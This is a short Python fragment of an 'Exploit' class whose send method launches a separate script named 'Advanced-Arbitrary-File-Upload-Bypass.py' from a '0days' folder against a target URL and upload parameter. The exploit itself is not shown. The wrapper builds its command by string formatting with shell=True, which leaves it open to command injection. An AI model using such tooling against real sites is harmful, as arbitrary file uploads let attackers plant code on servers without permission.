...
class Exploit(object):
    ...
    def send(self):
        sub.call(
            f"python3 ../0days/Advanced-Arbitrary-File-Upload-Bypass.py PERL {self.file_to_upload} {self.directory_with_file} {self.url} {self.param_that_accepts_files}", shell=True)
